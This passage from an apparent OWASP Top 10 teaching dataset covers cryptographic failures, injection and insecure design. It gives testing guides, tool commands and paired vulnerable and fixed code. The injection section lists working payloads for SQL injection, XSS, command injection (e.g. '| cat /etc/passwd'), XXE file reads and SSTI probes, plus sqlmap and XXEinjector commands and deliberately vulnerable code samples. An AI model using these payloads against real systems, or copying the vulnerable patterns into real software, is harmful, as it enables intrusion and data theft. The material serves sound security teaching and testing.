    return secrets.token_hex(32)  # 256-bit hex string

def generate_otp():
    # Cryptographically secure random integer
    return str(secrets.randbelow(900000) + 100000)  # 6-digit OTP`,
      },
      {
        title: 'Vulnerable: Sensitive Data in Local Storage (JavaScript)',
        language: 'javascript',
        vulnerable: `
// Storing sensitive data in localStorage -- accessible via XSS
function storeUserSession(user) {
  localStorage.setItem('authToken', user.token);
  localStorage.setItem('creditCard', user.creditCardNumber);
  localStorage.setItem('ssn', user.ssn);
}

function setAuthCookie(token) {
  // No Secure or HttpOnly flags
  document.cookie = 'session=' + token + '; path=/';
}`,
        fixed: `
// Store only non-sensitive identifiers client-side
// Sensitive tokens should be in HttpOnly cookies set by the server
function storeUserSession(user) {
  // Only store non-sensitive display preferences
  sessionStorage.setItem('displayName', user.name);
  sessionStorage.setItem('theme', user.preferences.theme);
  // Auth token set as HttpOnly cookie by server
}

// Server-side cookie setting (Express example)
function setAuthCookie(res, token) {
  res.cookie('session', token, {
    httpOnly: true,     // Not accessible via JavaScript
    secure: true,       // Only sent over HTTPS
    sameSite: 'strict', // CSRF protection
    maxAge: 900000,     // 15 minutes
    path: '/',
    domain: '.example.com',
  });
}`,
      },
    ],

    references: [
      'https://owasp.org/Top10/A02_2021-Cryptographic_Failures/',
      'https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html',
      'https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Security_Cheat_Sheet.html',
      'https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html',
      'https://wiki.mozilla.org/Security/Server_Side_TLS',
      'NIST SP 800-131A Rev 2: Transitioning the Use of Cryptographic Algorithms and Key Lengths',
      'Case Study: Adobe breach (2013) -- 153 million user records with 3DES-encrypted passwords (not hashed)',
      'Case Study: Heartbleed (2014) -- OpenSSL bug exposed private keys and session data',
      'Case Study: Equifax breach (2017) -- unencrypted PII for 147 million people',
    ],
  },

  // =========================================================================
  // A03:2021 - Injection
  // =========================================================================
  {
    id: 'A03',
    name: 'Injection',
    description:
      'An application is vulnerable to injection when user-supplied data is not validated, ' +
      'filtered, or sanitized; dynamic queries or non-parameterized calls without context-aware ' +
      'escaping are used directly in the interpreter; hostile data is used within ORM search ' +
      'parameters to extract additional or sensitive records; or hostile data is directly used ' +
      'or concatenated. Injection dropped from the first position in 2017 to third in 2021 but ' +
      'remains critical. Notable CWEs include CWE-79 (Cross-site Scripting), CWE-89 (SQL ' +
      'Injection), and CWE-73 (External Control of File Name or Path).',

    impact:
      'Injection can result in data loss, corruption, or disclosure to unauthorized parties, ' +
      'loss of accountability, denial of access, and complete host takeover. SQL injection ' +
      'alone has been responsible for some of the largest data breaches in history. Cross-site ' +
      'scripting (XSS) can lead to session hijacking, account takeover, defacement, and ' +
      'malware distribution. Command injection can give attackers full control of the server.',

    examples: [
      'SQL injection: classic, blind (boolean-based, time-based), error-based, UNION-based, stacked queries',
      'NoSQL injection: MongoDB operator injection ($gt, $ne, $regex), JavaScript injection in MongoDB',
      'Cross-site scripting (XSS): reflected, stored, DOM-based, mutation XSS (mXSS)',
      'OS command injection: semicolon, pipe, backtick, $() command substitution',
      'LDAP injection: modifying LDAP queries to bypass authentication or extract data',
      'XML injection / XXE: external entity injection for file reading, SSRF, DoS',
      'XPath injection: manipulating XPath queries to access unauthorized XML data',
      'Template injection (SSTI): server-side template injection in Jinja2, Twig, Freemarker, Velocity',
      'Header injection: HTTP response splitting, CRLF injection',
      'Email header injection: injecting CC/BCC headers via form fields',
      'Expression Language (EL) injection: Spring, JSP expression language attacks',
      'ORM injection: Hibernate HQL injection, Django ORM injection via extra()',
      'CSS injection: exfiltrating data via CSS selectors and attribute selectors',
      'CRLF injection: log injection, HTTP response splitting',
      'LaTeX injection: command execution through LaTeX processing',
      'Formula injection (CSV injection): =cmd|... in spreadsheet exports',
      'GraphQL injection: query manipulation, nested query DoS (query batching)',
      'Server-Side Includes (SSI) injection',
      'Log injection (log forging): injecting fake log entries',
      'PDF injection: JavaScript execution in PDF generation',
      'Host header injection: password reset poisoning, cache poisoning',
      'Second-order injection: stored payloads triggered by subsequent operations',
      'Deserialization injection: object injection via insecure deserialization',
      'OGNL injection: Struts2 remote code execution',
      'JNDi injection: Log4Shell (CVE-2021-44228) JNDI lookup injection',
      'Regular expression injection (ReDoS): catastrophic backtracking',
      'SMTP injection: injecting SMTP commands via form fields',
      'JSON injection: manipulating JSON structure via string concatenation',
      'Polyglot payloads: single payload that works across multiple injection contexts',
      'Prototype pollution in JavaScript: __proto__ manipulation',
      'Server-Side Request Forgery via injection points',
      'WebSocket injection: XSS or command injection via WebSocket messages',
      'Open redirect via URL injection',
      'HTTP parameter pollution: duplicate parameter injection',
      'Unicode normalization bypass: using Unicode equivalents to bypass WAF',
      'Null byte injection: %00 to bypass file extension checks',
      'Wildcard injection in shell commands: filename-based injection',
      'DNS rebinding: bypassing same-origin via DNS resolution manipulation',
      'PostMessage injection: cross-origin messaging abuse',
      'Mass assignment / parameter binding injection',
    ],

    testingGuide: [
      '1. Identify all input vectors: URL parameters, POST data, headers, cookies, file uploads',
      '2. Test SQL injection with single quote: \' OR 1=1-- , " OR ""="',
      '3. Test time-based blind SQLi: \'; WAITFOR DELAY \'0:0:5\'-- or \' AND SLEEP(5)--',
      '4. Test UNION-based SQLi: \' UNION SELECT null,null,null-- (incrementing columns)',
      '5. Test error-based SQLi: \' AND extractvalue(1,concat(0x7e,version()))--',
      '6. Test NoSQL injection: {"username": {"$gt": ""}, "password": {"$gt": ""}}',
      '7. Test XSS reflected: <script>alert(1)</script>, <img src=x onerror=alert(1)>',
      '8. Test XSS stored: submit payloads in forms, comments, profiles',
      '9. Test DOM XSS: check for document.location, document.URL used in innerHTML/eval',
      '10. Test XSS filter bypass: <ScRiPt>alert(1)</ScRiPt>, <svg/onload=alert(1)>',
      '11. Test XSS with encoding: &#x3C;script&#x3E;, javascript:alert(1)',
      '12. Test command injection: ; ls, | cat /etc/passwd, `whoami`, $(id)',
      '13. Test command injection in filenames: file;id.txt, file|id.txt',
      '14. Test LDAP injection: *)(|(cn=*)), admin)(&)',
      '15. Test XXE: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
      '16. Test blind XXE: use out-of-band interaction with Burp Collaborator',
      '17. Test SSTI: {{7*7}}, ${7*7}, <%= 7*7 %>, #{7*7}',
      '18. Test SSTI in Jinja2: {{config}}, {{request.application.__globals__}}',
      '19. Test header injection: %0d%0aInjected-Header: value',
      '20. Test email injection: test@email.com%0aCc:attacker@evil.com',
      '21. Test XPath injection: \' or 1=1 or \'a\'=\'a',
      '22. Test EL injection: ${applicationScope}, #{bean.method}',
      '23. Test CSV injection: =cmd|\'...\'!A0, +cmd|\'...\'!A0',
      '24. Test log injection: inject CRLF and fake log entries',
      '25. Test second-order injection: store payloads then trigger different functionality',
      '26. Test prototype pollution: __proto__[isAdmin]=true, constructor.prototype.isAdmin=true',
      '27. Test GraphQL injection: { __schema { types { name fields { name } } } }',
      '28. Test ReDoS: submit strings causing catastrophic backtracking in regex patterns',
      '29. Test deserialization: craft serialized objects with gadget chains',
      '30. Test host header injection: modify Host header and check password reset emails',
      '31. Test open redirect: ?redirect=https://evil.com, //evil.com, /\\evil.com',
      '32. Test HTTP parameter pollution: ?id=1&id=2 (different frameworks handle differently)',
      '33. Test WAF bypass with encoding: double URL encoding, Unicode normalization',
      '34. Test WAF bypass with comments: /**/ in SQL, <scr<!-- -->ipt>',
      '35. Test null byte injection: file.php%00.jpg',
      '36. Test mass assignment: add extra fields like role=admin in registration',
      '37. Test JSON injection: {"key": "value\", \"injected\": \"data"}',
      '38. Test CRLF in URLs: %0d%0a in URL parameters',
      '39. Test for polyglot payloads: jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A',
      '40. Test Unicode normalization: using fullwidth characters (U+FF1C for <)',
      '41. Test WebSocket injection: send XSS payloads via WebSocket messages',
      '42. Test for mutation XSS (mXSS): payloads that mutate through DOM parsing',
    ],

    tools: [
      'sqlmap: sqlmap -u "https://example.com/page?id=1" --batch --dbs',
      'sqlmap (POST): sqlmap -u "https://example.com/login" --data="user=a&pass=b" --batch',
      'sqlmap (cookie): sqlmap -u "https://example.com/" --cookie="id=1*" --batch --level=3',
      'NoSQLMap: nosqlmap -u https://example.com/login (MongoDB injection)',
      'XSStrike: xsstrike -u "https://example.com/search?q=test"',
      'Dalfox: dalfox url "https://example.com/search?q=test"',
      'commix: commix -u "https://example.com/ping?ip=127.0.0.1"',
      'tplmap: tplmap -u "https://example.com/page?name=test"',
      'XXEinjector: ruby XXEinjector.rb --host=attacker.com --file=request.txt',
      'Burp Suite: active scanner, Intruder with fuzzing payloads',
      'OWASP ZAP: active scanner with injection testing policies',
      'Nuclei: nuclei -u https://example.com -t cves/ -t vulnerabilities/sqli/',
      'wfuzz: wfuzz -z file,sqli-payloads.txt "https://example.com/page?id=FUZZ"',
      'ffuf: ffuf -u "https://example.com/search?q=FUZZ" -w xss-payloads.txt -mr "<script>"',
      'ghauri: ghauri -u "https://example.com/page?id=1" --batch (advanced SQLi)',
      'Retire.js: retire --js (identify vulnerable JavaScript libraries)',
      'ESLint security plugin: eslint --config security-rules.json src/',
      'Semgrep: semgrep --config=p/owasp-top-ten (static analysis for injection)',
      'Bandit: bandit -r . -ll (Python security linter)',
    ],

    remediation: [
      'Use parameterized queries (prepared statements) for all database interactions',
      'Use ORM frameworks with parameterized query support (avoid raw SQL)',
      'Apply input validation: whitelist acceptable values, reject unexpected input',
      'Encode output based on context: HTML encoding, JavaScript encoding, URL encoding, CSS encoding',
      'Use Content-Security-Policy headers to mitigate XSS impact',
      'Use auto-escaping template engines (Jinja2 autoescape, React JSX)',
      'Avoid interpreting user input as OS commands -- use language-native libraries instead',
      'Disable XML external entity processing in all XML parsers',
      'Use allowlists for server-side input validation',
      'Apply the principle of least privilege for database accounts',
      'Implement WAF rules as defense-in-depth (not sole protection)',
      'Use LIMIT and other SQL controls to prevent mass disclosure in case of injection',
      'Escape special characters in LDAP, XPath, and other query languages',
      'Implement proper output encoding for the specific context (HTML, JS, CSS, URL)',
      'Use frameworks that automatically prevent injection (React for XSS, Django ORM for SQLi)',
    ],

    codeExamples: [
      {
        title: 'Vulnerable: SQL Injection in Python',
        language: 'python',
        vulnerable: `
@app.route('/users')
def search_users():
    name = request.args.get('name')
    # String concatenation -- vulnerable to SQL injection
    query = "SELECT * FROM users WHERE name = '" + name + "'"
    result = db.engine.execute(query)
    return jsonify([dict(row) for row in result])

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    # f-string in SQL -- equally vulnerable
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    user = db.engine.execute(query).fetchone()
    if user:
        session['user_id'] = user['id']
        return redirect('/dashboard')
    return 'Invalid credentials', 401`,
        fixed: `
@app.route('/users')
def search_users():
    name = request.args.get('name', '')
    # Parameterized query -- safe from SQL injection
    query = text("SELECT * FROM users WHERE name = :name")
    result = db.engine.execute(query, name=name)
    return jsonify([dict(row) for row in result])

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '')
    password = request.form.get('password', '')

    # Use ORM with parameterized lookup
    user = User.query.filter_by(username=username).first()
    if user and bcrypt.check_password_hash(user.password_hash, password):
        session['user_id'] = user.id
        return redirect('/dashboard')
    # Generic error message -- do not reveal which field is wrong
    return 'Invalid credentials', 401`,
      },
      {
        title: 'Vulnerable: SQL Injection in Node.js',
        language: 'javascript',
        vulnerable: `
app.get('/api/products', (req, res) => {
  const category = req.query.category;
  // String concatenation in SQL query
  const sql = "SELECT * FROM products WHERE category = '" + category + "'";
  db.query(sql, (err, results) => {
    if (err) return res.status(500).json({ error: err.message });
    res.json(results);
  });
});

app.post('/api/login', (req, res) => {
  const { username, password } = req.body;
  const sql = \`SELECT * FROM users WHERE username='\${username}' AND password='\${password}'\`;
  db.query(sql, (err, results) => {
    if (err) return res.status(500).json({ error: err.message });
    if (results.length > 0) {
      req.session.userId = results[0].id;
      return res.json({ success: true });
    }
    res.status(401).json({ error: 'Invalid credentials' });
  });
});`,
        fixed: `
app.get('/api/products', (req, res) => {
  const category = req.query.category;
  // Parameterized query with placeholder
  const sql = 'SELECT * FROM products WHERE category = ?';
  db.query(sql, [category], (err, results) => {
    if (err) {
      logger.error('Database error', { error: err.message });
      return res.status(500).json({ error: 'Internal error' });
    }
    res.json(results);
  });
});

app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;
  // Parameterized query
  const sql = 'SELECT * FROM users WHERE username = ?';
  db.query(sql, [username], async (err, results) => {
    if (err) {
      logger.error('Database error', { error: err.message });
      return res.status(500).json({ error: 'Internal error' });
    }
    if (results.length > 0) {
      const match = await bcrypt.compare(password, results[0].password_hash);
      if (match) {
        req.session.userId = results[0].id;
        return res.json({ success: true });
      }
    }
    res.status(401).json({ error: 'Invalid credentials' });
  });
});`,
      },
      {
        title: 'Vulnerable: SQL Injection in Java JDBC',
        language: 'java',
        vulnerable: `
public User getUser(String userId) throws SQLException {
    String query = "SELECT * FROM users WHERE id = '" + userId + "'";
    Statement stmt = connection.createStatement();
    ResultSet rs = stmt.executeQuery(query);
    if (rs.next()) {
        return new User(rs.getString("id"), rs.getString("name"));
    }
    return null;
}

public List<Product> searchProducts(String searchTerm) throws SQLException {
    String query = "SELECT * FROM products WHERE name LIKE '%" + searchTerm + "%'";
    Statement stmt = connection.createStatement();
    ResultSet rs = stmt.executeQuery(query);
    List<Product> products = new ArrayList<>();
    while (rs.next()) {
        products.add(new Product(rs));
    }
    return products;
}`,
        fixed: `
public User getUser(String userId) throws SQLException {
    String query = "SELECT * FROM users WHERE id = ?";
    PreparedStatement pstmt = connection.prepareStatement(query);
    pstmt.setString(1, userId);
    ResultSet rs = pstmt.executeQuery();
    if (rs.next()) {
        return new User(rs.getString("id"), rs.getString("name"));
    }
    return null;
}

public List<Product> searchProducts(String searchTerm) throws SQLException {
    String query = "SELECT * FROM products WHERE name LIKE ?";
    PreparedStatement pstmt = connection.prepareStatement(query);
    // Escape wildcards in user input, then wrap with %
    String sanitized = searchTerm.replace("%", "\\\\%").replace("_", "\\\\_");
    pstmt.setString(1, "%" + sanitized + "%");
    ResultSet rs = pstmt.executeQuery();
    List<Product> products = new ArrayList<>();
    while (rs.next()) {
        products.add(new Product(rs));
    }
    return products;
}`,
      },
      {
        title: 'Vulnerable: XSS in JavaScript/HTML',
        language: 'javascript',
        vulnerable: `
// DOM-based XSS -- inserting user input directly into DOM
function displaySearch() {
  const query = new URLSearchParams(window.location.search).get('q');
  document.getElementById('results').innerHTML =
    '<h2>Results for: ' + query + '</h2>';
}

// Reflected XSS in Express
app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send('<h1>Search results for: ' + query + '</h1>');
});

// Stored XSS -- rendering user content without encoding
app.get('/comments', (req, res) => {
  const comments = db.getComments();
  let html = '<div>';
  comments.forEach(c => {
    html += '<p>' + c.text + '</p>';  // No encoding
  });
  html += '</div>';
  res.send(html);
});`,
        fixed: `
// Safe DOM manipulation -- use textContent instead of innerHTML
function displaySearch() {
  const query = new URLSearchParams(window.location.search).get('q');
  const heading = document.createElement('h2');
  heading.textContent = 'Results for: ' + query;
  document.getElementById('results').appendChild(heading);
}

// HTML encoding helper
function escapeHtml(str) {
  const map = {
    '&': '&amp;', '<': '&lt;', '>': '&gt;',
    '"': '&quot;', "'": '&#x27;', '/': '&#x2F;',
  };
  return String(str).replace(/[&<>"'/]/g, c => map[c]);
}

// Safe reflected output
app.get('/search', (req, res) => {
  const query = escapeHtml(req.query.q || '');
  res.send('<h1>Search results for: ' + query + '</h1>');
});

// Use a template engine with auto-escaping (e.g., EJS, Pug, Nunjucks)
// nunjucks auto-escapes by default
app.get('/comments', (req, res) => {
  const comments = db.getComments();
  res.render('comments.html', { comments });
  // In template: <p>{{ comment.text }}</p> -- auto-escaped
});

// Set CSP header as defense-in-depth
app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy',
    "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'");
  next();
});`,
      },
      {
        title: 'Vulnerable: Command Injection in Python',
        language: 'python',
        vulnerable: `
import os
import subprocess

@app.route('/api/ping')
def ping():
    host = request.args.get('host')
    # Direct shell command with user input
    output = os.popen('ping -c 3 ' + host).read()
    return jsonify({'output': output})

@app.route('/api/dns')
def dns_lookup():
    domain = request.args.get('domain')
    # shell=True with user input is dangerous
    result = subprocess.run(
        'nslookup ' + domain,
        shell=True,
        capture_output=True,
        text=True
    )
    return jsonify({'output': result.stdout})`,
        fixed: `
import subprocess
import re

HOSTNAME_RE = re.compile(r'^[a-zA-Z0-9][a-zA-Z0-9.\\-]{0,253}[a-zA-Z0-9]$')

@app.route('/api/ping')
def ping():
    host = request.args.get('host', '')
    # Validate input against strict allowlist pattern
    if not HOSTNAME_RE.match(host):
        return jsonify({'error': 'Invalid hostname'}), 400
    try:
        # Use list form (no shell) and avoid user input in shell command
        result = subprocess.run(
            ['ping', '-c', '3', '-W', '5', host],
            capture_output=True,
            text=True,
            timeout=15
        )
        return jsonify({'output': result.stdout})
    except subprocess.TimeoutExpired:
        return jsonify({'error': 'Request timed out'}), 408

@app.route('/api/dns')
def dns_lookup():
    domain = request.args.get('domain', '')
    if not HOSTNAME_RE.match(domain):
        return jsonify({'error': 'Invalid domain'}), 400
    # Use dnspython library instead of shell commands
    import dns.resolver
    try:
        answers = dns.resolver.resolve(domain, 'A')
        records = [str(rdata) for rdata in answers]
        return jsonify({'records': records})
    except dns.resolver.NXDOMAIN:
        return jsonify({'error': 'Domain not found'}), 404`,
      },
      {
        title: 'Vulnerable: NoSQL Injection in Node.js (MongoDB)',
        language: 'javascript',
        vulnerable: `
// MongoDB operator injection
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;
  // If attacker sends: {"username": {"$gt": ""}, "password": {"$gt": ""}}
  // This returns the first user in the collection
  const user = await User.findOne({ username, password });
  if (user) {
    return res.json({ token: generateToken(user) });
  }
  res.status(401).json({ error: 'Invalid credentials' });
});

// MongoDB $where injection
app.get('/api/users', async (req, res) => {
  const filter = req.query.filter;
  const users = await User.find({
    $where: 'this.name == "' + filter + '"'
  });
  res.json(users);
});`,
        fixed: `
const mongoSanitize = require('express-mongo-sanitize');
app.use(mongoSanitize()); // Strips $ and . from user input

app.post('/api/login', async (req, res) => {
  let { username, password } = req.body;

  // Ensure username and password are strings (not objects)
  if (typeof username !== 'string' || typeof password !== 'string') {
    return res.status(400).json({ error: 'Invalid input type' });
  }

  // Find user by username only, then verify password hash
  const user = await User.findOne({ username });
  if (user && await bcrypt.compare(password, user.passwordHash)) {
    return res.json({ token: generateToken(user) });
  }
  res.status(401).json({ error: 'Invalid credentials' });
});

// Use proper query operators instead of $where
app.get('/api/users', async (req, res) => {
  const filter = String(req.query.filter || '');
  // Escape regex special characters
  const escaped = filter.replace(/[.*+?^\${}()|[\\]\\\\]/g, '\\\\$&');
  const users = await User.find({
    name: { $regex: new RegExp('^' + escaped + '$', 'i') }
  }).limit(100);
  res.json(users);
});`,
      },
      {
        title: 'Vulnerable: SSTI in Python Jinja2',
        language: 'python',
        vulnerable: `
from flask import Flask, request
from jinja2 import Template

@app.route('/greet')
def greet():
    name = request.args.get('name', 'World')
    # User input rendered as template -- SSTI vulnerability
    template = Template('Hello ' + name + '!')
    return template.render()
    # Attack: ?name={{config}} or ?name={{request.application.__globals__}}`,
        fixed: `
from flask import Flask, request, render_template_string
from markupsafe import escape

@app.route('/greet')
def greet():
    name = request.args.get('name', 'World')
    # Option 1: Use template variable (auto-escaped)
    return render_template_string('Hello {{ name }}!', name=name)

    # Option 2: Manual escaping
    # return 'Hello ' + escape(name) + '!'

    # Option 3: Use a pre-defined template file (best practice)
    # return render_template('greet.html', name=name)`,
      },
      {
        title: 'Vulnerable: XXE in Java',
        language: 'java',
        vulnerable: `
import javax.xml.parsers.DocumentBuilderFactory;

public Document parseXml(String xmlInput) throws Exception {
    // Default configuration allows external entities
    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
    DocumentBuilder builder = factory.newDocumentBuilder();
    return builder.parse(new InputSource(new StringReader(xmlInput)));
    // Attack payload:
    // <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
    // <data>&xxe;</data>
}`,
        fixed: `
import javax.xml.parsers.DocumentBuilderFactory;

public Document parseXml(String xmlInput) throws Exception {
    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();

    // Disable external entities and DTDs
    factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
    factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
    factory.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
    factory.setFeature("http://apache.org/xml/features/nonvalidating/load-external-dtd", false);
    factory.setXIncludeAware(false);
    factory.setExpandEntityReferences(false);

    DocumentBuilder builder = factory.newDocumentBuilder();
    return builder.parse(new InputSource(new StringReader(xmlInput)));
}`,
      },
      {
        title: 'Vulnerable: Command Injection in Java',
        language: 'java',
        vulnerable: `
@RequestMapping("/api/lookup")
public String dnsLookup(@RequestParam String domain) throws IOException {
    // Direct string concatenation into Runtime.exec
    Process process = Runtime.getRuntime().exec("nslookup " + domain);
    BufferedReader reader = new BufferedReader(
        new InputStreamReader(process.getInputStream()));
    StringBuilder output = new StringBuilder();
    String line;
    while ((line = reader.readLine()) != null) {
        output.append(line).append("\\n");
    }
    return output.toString();
}`,
        fixed: `
@RequestMapping("/api/lookup")
public String dnsLookup(@RequestParam String domain) {
    // Validate input
    if (!domain.matches("^[a-zA-Z0-9][a-zA-Z0-9.\\\\-]{0,253}[a-zA-Z0-9]$")) {
        throw new IllegalArgumentException("Invalid domain name");
    }

    // Use ProcessBuilder with argument list (no shell interpretation)
    try {
        ProcessBuilder pb = new ProcessBuilder("nslookup", domain);
        pb.redirectErrorStream(true);
        Process process = pb.start();

        // Set timeout
        if (!process.waitFor(10, TimeUnit.SECONDS)) {
            process.destroyForcibly();
            throw new TimeoutException("DNS lookup timed out");
        }

        BufferedReader reader = new BufferedReader(
            new InputStreamReader(process.getInputStream()));
        StringBuilder output = new StringBuilder();
        String line;
        while ((line = reader.readLine()) != null) {
            output.append(line).append("\\n");
        }
        return output.toString();
    } catch (Exception e) {
        logger.error("DNS lookup failed for domain: {}", domain, e);
        throw new InternalServerException("Lookup failed");
    }
}`,
      },
      {
        title: 'Vulnerable: Prototype Pollution in JavaScript',
        language: 'javascript',
        vulnerable: `
// Vulnerable merge function
function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === 'object' && source[key] !== null) {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// Attacker sends: {"__proto__": {"isAdmin": true}}
app.put('/api/user/settings', (req, res) => {
  const settings = merge({}, req.body);
  // Now ({}).isAdmin === true for all objects
});`,
        fixed: `
// Safe merge function that blocks prototype pollution
function safeMerge(target, source) {
  for (const key of Object.keys(source)) {
    // Block prototype pollution vectors
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
      continue;
    }
    if (typeof source[key] === 'object' && source[key] !== null
        && !Array.isArray(source[key])) {
      if (!target[key] || typeof target[key] !== 'object') {
        target[key] = Object.create(null);
      }
      safeMerge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

// Or use Object.create(null) as base to avoid prototype chain
app.put('/api/user/settings', (req, res) => {
  // Validate and sanitize input schema
  const allowedFields = ['theme', 'language', 'notifications'];
  const settings = {};
  for (const field of allowedFields) {
    if (req.body[field] !== undefined) {
      settings[field] = req.body[field];
    }
  }
  updateUserSettings(req.user.id, settings);
  res.json({ success: true });
});`,
      },
    ],

    references: [
      'https://owasp.org/Top10/A03_2021-Injection/',
      'https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html',
      'https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html',
      'https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html',
      'https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html',
      'https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html',
      'https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html',
      'https://portswigger.net/web-security/sql-injection/cheat-sheet',
      'Case Study: Sony Pictures (2011) -- SQL injection exposed 77 million PlayStation Network accounts',
      'Case Study: TalkTalk (2015) -- SQL injection led to theft of 157,000 customer records, 400K GBP fine',
      'Case Study: Log4Shell CVE-2021-44228 -- JNDI injection in Log4j affected millions of Java applications',
      'Case Study: British Airways (2018) -- XSS-based Magecart skimmer stole 380,000 card details',
    ],
  },

  // =========================================================================
  // A04:2021 - Insecure Design
  // =========================================================================
  {
    id: 'A04',
    name: 'Insecure Design',
    description:
      'Insecure design is a broad category representing different weaknesses, expressed as ' +
      '"missing or ineffective control design." This is not the source for all other Top 10 ' +
      'risk categories. There is a difference between insecure design and insecure ' +
      'implementation. Design flaws cannot be fixed by a perfect implementation because by ' +
      'definition, needed security controls were never created to defend against specific ' +
      'attacks. An insecure design cannot be fixed by implementation alone. Factors that ' +
      'contribute to insecure design include lack of business risk profiling, failure to ' +
      'determine the level of security design required, and missing threat modeling.',

    impact:
      'Insecure design can lead to systemic vulnerabilities that affect the entire application ' +
      'architecture. These flaws often cannot be patched without significant redesign. Business ' +
      'logic flaws can result in financial losses, fraud, data exposure, and regulatory ' +
      'violations. Because these are design-level issues, they tend to be more severe and ' +
      'costly to remediate than implementation bugs.',

    examples: [
      'No rate limiting on authentication endpoints allowing unlimited brute force attempts',
      'Security questions as the only account recovery mechanism (easily researched answers)',
      'Missing account lockout after failed login attempts',
      'Password reset tokens that do not expire or are predictable',
      'Business logic flaws: applying discount codes multiple times, negative quantity orders',
      'Missing transaction limits: no daily transfer limit on financial operations',
      'Trust boundaries not defined: client-side validation as the only validation',
      'Missing threat modeling: no consideration of attack scenarios during design',
      'Credential recovery via email with no rate limiting or account verification',
      'Missing separation of duties: same user can approve and execute financial transactions',
      'No fraud detection mechanisms for high-value transactions',
      'Missing anti-automation controls for sensitive operations',
      'Predictable resource locations (sequential IDs, predictable URLs)',
      'Missing input validation strategy: no centralized validation framework',
      'No defense-in-depth: single point of failure in security controls',
      'Missing secure defaults: features enabled by default that should require opt-in',
      'No consideration of data sensitivity classification in design',
      'Missing audit trail for critical business operations',
      'Shared accounts or credentials between environments (dev/staging/production)',
      'Missing secure communication between microservices',
      'No consideration of abuse cases in user stories',
      'Missing circuit breaker patterns for external service failures',
    ],

    testingGuide: [
      '1. Review application architecture documents and threat models (if they exist)',
      '2. Identify business-critical workflows and map their security controls',
      '3. Test for rate limiting: send 100+ requests per second to login, registration, API endpoints',
      '4. Test business logic: order flow, payment processing, discount/coupon application',
      '5. Test for negative values: negative quantities, negative prices, negative transfer amounts',
      '6. Test for integer overflow in quantity/price calculations',
      '7. Test for race conditions in financial transactions (send concurrent requests)',
      '8. Test multi-step workflows: can steps be skipped, repeated, or reordered?',
      '9. Test for missing re-authentication on sensitive operations',
      '10. Test for account enumeration in login, registration, and password reset',
      '11. Test password reset: token predictability, expiration, reuse',
      '12. Test for unlimited OTP/2FA attempts (brute force 2FA codes)',
      '13. Test referral/rewards systems for self-referral or circular referral abuse',
      '14. Test file upload: size limits, type validation, storage location',
      '15. Test for missing transaction signing or confirmation for financial operations',
      '16. Test for privilege escalation through normal user workflows',
      '17. Test for information disclosure in error messages',
      '18. Test for abuse of batch/bulk operations',
      '19. Test for missing cancellation or reversal controls',
      '20. Test for time-of-check to time-of-use (TOCTOU) vulnerabilities in business logic',
      '21. Verify that security controls exist at the design level, not just implementation',
      '22. Test for missing anti-bot controls (CAPTCHA, proof-of-work)',
    ],

    tools: [
      'Burp Suite: Intruder for rate limiting tests, Repeater for business logic testing',
      'OWASP ZAP: active scanner and custom scripts for business logic',
      'Threat Dragon: OWASP threat modeling tool',
      'Microsoft Threat Modeling Tool: STRIDE-based threat modeling',
      'CAIRIS: Computer-Aided Integration of Requirements and Information Security',
      'draw.io / Lucidchart: for creating data flow diagrams (DFDs)',
      'PlantUML: text-based UML diagrams for architecture documentation',
      'Locust / k6: load testing tools for rate limiting verification',
      'Artillery: artillery run rate-limit-test.yml (load testing)',
      'Custom scripts: Python/Bash scripts for business logic abuse testing',
      'Semgrep: semgrep --config=p/security-audit (design pattern detection)',
      'SonarQube: static analysis for design-level issues',
    ],

    remediation: [
      'Establish and use a secure development lifecycle (SDL) with security activities at each phase',
      'Perform threat modeling for every feature: identify threats, trust boundaries, and attack surfaces',
      'Use abuse cases and misuse cases alongside user stories',
      'Implement rate limiting on all authentication and sensitive endpoints',
      'Design with the principle of least privilege from the start',
      'Implement defense-in-depth: multiple layers of security controls',
      'Use established design patterns for common security requirements',
      'Implement proper transaction management with atomicity and integrity checks',
      'Design for audit: log all security-relevant events',
      'Implement proper error handling that does not reveal sensitive information',
      'Use a centralized security control library rather than ad-hoc implementations',
      'Implement circuit breakers and failsafe defaults',
      'Separate concerns: authentication, authorization, input validation, and business logic',
      'Design for testability: security controls should be independently testable',
      'Conduct architecture security reviews before implementation begins',
      'Use reference architectures and security patterns from OWASP, NIST, BSIMM',
    ],

    codeExamples: [
      {
        title: 'Vulnerable: No Rate Limiting on Login (Node.js)',
        language: 'javascript',
        vulnerable: `
// No rate limiting -- unlimited login attempts
app.post('/api/login', async (req, res) => {
  const { username, password } = req.body;
  const user = await User.findOne({ username });
